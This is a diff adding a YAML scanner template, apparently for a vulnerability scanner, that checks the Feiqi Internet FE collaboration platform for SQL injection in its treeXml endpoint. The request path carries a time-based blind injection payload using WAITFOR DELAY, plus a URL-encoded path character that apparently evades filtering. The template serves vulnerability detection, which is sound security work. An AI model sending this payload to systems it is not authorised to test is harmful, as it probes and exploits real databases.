@@ -1,0 +1,11 @@
+name: 飞企互联-FE业务协作平台-treeXml-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:5'--&type=function
+    expression:
+      status: 200
+      sleep: 5
